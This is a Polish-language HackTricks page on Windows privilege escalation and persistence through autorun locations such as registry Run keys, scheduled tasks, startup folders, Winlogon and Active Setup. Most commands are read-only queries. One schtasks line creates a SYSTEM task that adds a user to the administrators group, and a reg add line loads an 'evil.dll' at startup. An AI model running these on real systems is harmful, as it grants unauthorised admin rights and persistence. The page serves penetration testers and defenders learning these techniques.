# Eskalacja uprawnień za pomocą Autoruns

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Wskazówka dotycząca nagród za błędy**: **Zarejestruj się** na platformie **Intigriti**, premium **platformie nagród za błędy stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody aż do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** może być używany do uruchamiania programów podczas **uruchamiania systemu**. Sprawdź, które binaria są zaprogramowane do uruchomienia podczas uruchamiania systemu za pomocą:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zaplanowane zadania

**Zadania** mogą być zaplanowane do uruchamiania z **określoną częstotliwością**. Sprawdź, które pliki binarne są zaplanowane do uruchomienia za pomocą:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Foldery

Wszystkie binaria znajdujące się w **folderach uruchamiania zostaną uruchomione przy starcie systemu**. Wspólne foldery uruchamiania to te wymienione poniżej, ale folder uruchamiania jest wskazany w rejestrze. [Przeczytaj to, aby dowiedzieć się gdzie.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Rejestr

{% hint style="info" %}
[Notatka odnośnie tego](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Wpis w rejestrze **Wow6432Node** wskazuje, że uruchamiasz wersję systemu Windows 64-bitową. System operacyjny używa tego klucza do wyświetlania oddzielnego widoku HKEY\_LOCAL\_MACHINE\SOFTWARE dla aplikacji 32-bitowych uruchamianych na wersjach systemu Windows 64-bitowych.
{% endhint %}

### Uruchamia się

**Powszechnie znane** wpisy AutoRun w rejestrze:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Klucze rejestru znane jako **Run** i **RunOnce** są przeznaczone do automatycznego uruchamiania programów za każdym razem, gdy użytkownik loguje się do systemu. Wartość danych klucza w postaci wiersza poleceń jest ograniczona do 260 znaków lub mniej.

**Uruchomienia usług** (mogą kontrolować automatyczne uruchamianie usług podczas uruchamiania systemu):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Na systemach Windows Vista i nowszych wersjach klucze rejestru **Run** i **RunOnce** nie są generowane automatycznie. Wpisy w tych kluczach mogą albo bezpośrednio uruchamiać programy, albo określać je jako zależności. Na przykład, aby załadować plik DLL podczas logowania, można użyć klucza rejestru **RunOnceEx** wraz z kluczem "Depend". Jest to pokazane poprzez dodanie wpisu rejestru do wykonania "C:\temp\evil.dll" podczas uruchamiania systemu:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Wykorzystanie 1**: Jeśli możesz pisać wewnątrz któregokolwiek z wymienionych rejestrów w **HKLM**, możesz eskalować uprawnienia, gdy inny użytkownik się loguje.
{% endhint %}

{% hint style="info" %}
**Wykorzystanie 2**: Jeśli możesz nadpisać którykolwiek z binarnych plików wskazanych w którymkolwiek z rejestrów w **HKLM**, możesz zmodyfikować ten binarny plik z tylnymi drzwiami, gdy inny użytkownik się loguje i eskalować uprawnienia.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Ścieżka uruchamiania

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skróty umieszczone w folderze **Startup** automatycznie uruchamiają usługi lub aplikacje podczas logowania użytkownika lub ponownego uruchomienia systemu. Lokalizacja folderu **Startup** jest określona w rejestrze dla zakresów **Local Machine** i **Current User**. Oznacza to, że każdy skrót dodany do tych określonych lokalizacji **Startup** spowoduje uruchomienie połączonej usługi lub programu po procesie logowania lub ponownego uruchomienia, co czyni to prostą metodą planowania automatycznego uruchamiania programów.

{% hint style="info" %}
Jeśli możesz nadpisać dowolny \[User] Shell Folder w **HKLM**, będziesz mógł wskazać go na folder kontrolowany przez Ciebie i umieścić tylną furtkę, która będzie wykonywana za każdym razem, gdy użytkownik zaloguje się do systemu, eskalując uprawnienia.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Klucze Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Zazwyczaj klucz **Userinit** jest ustawiony na **userinit.exe**. Jednakże, jeśli ten klucz zostanie zmodyfikowany, określony plik wykonywalny również zostanie uruchomiony przez **Winlogon** po zalogowaniu użytkownika. Podobnie, klucz **Shell** ma wskazywać na **explorer.exe**, który jest domyślną powłoką systemu Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Jeśli możesz nadpisać wartość rejestru lub plik binarny, będziesz mógł eskalować uprawnienia.
{% endhint %}

### Ustawienia zasad

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Sprawdź klucz **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Zmiana polecenia trybu awaryjnego

W rejestrze systemu Windows pod adresem `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` domyślnie ustawiona jest wartość **`AlternateShell`** na `cmd.exe`. Oznacza to, że gdy wybierzesz "Tryb awaryjny z wierszem polecenia" podczas uruchamiania (naciskając F8), używane jest `cmd.exe`. Jednak można skonfigurować komputer tak, aby automatycznie uruchamiał się w tym trybie bez konieczności naciskania F8 i ręcznego wyboru.

Kroki do utworzenia opcji rozruchowej umożliwiającej automatyczne uruchamianie w "Trybie awaryjnym z wierszem polecenia":

1. Zmień atrybuty pliku `boot.ini`, aby usunąć flagi tylko do odczytu, systemowe i ukryte: `attrib c:\boot.ini -r -s -h`
2. Otwórz plik `boot.ini` do edycji.
3. Wstaw linię taką jak: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Zapisz zmiany w pliku `boot.ini`.
5. Przywróć pierwotne atrybuty pliku: `attrib c:\boot.ini +r +s +h`

* **Wykorzystanie 1:** Zmiana klucza rejestru **AlternateShell** umożliwia ustawienie niestandardowego powłoki poleceń, potencjalnie do nieautoryzowanego dostępu.
* **Wykorzystanie 2 (Uprawnienia do zapisu w PATH):** Posiadanie uprawnień do zapisu w dowolnej części zmiennej systemowej **PATH**, szczególnie przed `C:\Windows\system32`, pozwala na wykonanie niestandardowego `cmd.exe`, który może stanowić tylną furtkę, jeśli system jest uruchomiony w trybie awaryjnym.
* **Wykorzystanie 3 (Uprawnienia do zapisu w PATH i boot.ini):** Uzyskanie dostępu do zapisu w `boot.ini` umożliwia automatyczne uruchamianie w trybie awaryjnym, ułatwiając nieautoryzowany dostęp przy następnym ponownym uruchomieniu.

Aby sprawdzić bieżące ustawienie **AlternateShell**, użyj tych poleceń:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Zainstalowany Komponent

Active Setup to funkcja w systemie Windows, która **inicjuje się przed pełnym załadowaniem środowiska pulpitu**. Priorytetowo wykonuje określone polecenia, które muszą zostać zakończone przed kontynuacją logowania użytkownika. Ten proces zachodzi nawet przed uruchomieniem innych wpisów startowych, takich jak te w sekcjach rejestru Run lub RunOnce.

Active Setup jest zarządzany poprzez następujące klucze rejestru:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

W tych kluczach istnieją różne podklucze, z których każdy odpowiada określonemu komponentowi. Wartości klucza szczególnie istotne to:

- **IsInstalled:**
  - `0` oznacza, że polecenie komponentu nie zostanie wykonane.
  - `1` oznacza, że polecenie zostanie wykonane raz dla każdego użytkownika, co jest domyślnym zachowaniem, jeśli wartość `IsInstalled` jest brakująca.
- **StubPath:** Definiuje polecenie do wykonania przez Active Setup. Może to być dowolne prawidłowe polecenie wiersza poleceń, na przykład uruchomienie `notatnika`.

**Wnioski dotyczące Bezpieczeństwa:**

- Modyfikowanie lub zapisywanie do klucza, gdzie **`IsInstalled`** jest ustawione na `"1"` z określonym **`StubPath`**, może prowadzić do nieautoryzowanego wykonania polecenia, potencjalnie umożliwiając eskalację uprawnień.
- Zmiana pliku binarnego wskazywanego w dowolnej wartości **`StubPath`** również może osiągnąć eskalację uprawnień, pod warunkiem posiadania wystarczających uprawnień.

Aby sprawdzić konfiguracje **`StubPath`** w komponentach Active Setup, można użyć tych poleceń:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Obiekty Pomocnicze Przeglądarki

### Przegląd Obiektów Pomocniczych Przeglądarki (BHO)

Obiekty Pomocnicze Przeglądarki (BHO) to moduły DLL dodające dodatkowe funkcje do przeglądarki Internet Explorer firmy Microsoft. Ładują się do Internet Explorera i Eksploratora Windows przy każdym uruchomieniu. Jednak ich wykonanie można zablokować, ustawiając klucz **NoExplorer** na 1, co uniemożliwia ich ładowanie się wraz z instancjami Eksploratora Windows.

BHO są kompatybilne z systemem Windows 10 poprzez Internet Explorer 11, ale nie są obsługiwane w przeglądarce Microsoft Edge, domyślnej przeglądarce w nowszych wersjach systemu Windows.

Aby zbadać zarejestrowane BHO w systemie, można sprawdzić następujące klucze rejestru:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Każdy BHO jest reprezentowany przez swój **CLSID** w rejestrze, który służy jako unikalny identyfikator. Szczegółowe informacje o każdym CLSID można znaleźć pod adresem `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Do zapytywania o BHO w rejestrze można wykorzystać następujące polecenia:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Rozszerzenia Internet Explorera

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Należy zauważyć, że rejestr będzie zawierał 1 nowy rejestr dla każdej biblioteki DLL i będzie reprezentowany przez **CLSID**. Informacje o CLSID można znaleźć w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Sterowniki czcionek

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Otwórz polecenie

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcje Wykonywania Plików Obrazów
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Należy zauważyć, że wszystkie strony, na których można znaleźć autostarty, **zostały już przeszukane przez** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Jednak dla **bardziej kompleksowej listy** plików uruchamianych automatycznie można użyć [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) z SysInternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Więcej

**Znajdź więcej programów uruchamianych automatycznie, takich jak rejestry w** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## Odnośniki

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Wskazówka dotycząca nagrody za błąd**: **Zarejestruj się** na platformie **Intigriti**, ekskluzywnej platformie **nagród za błędy stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
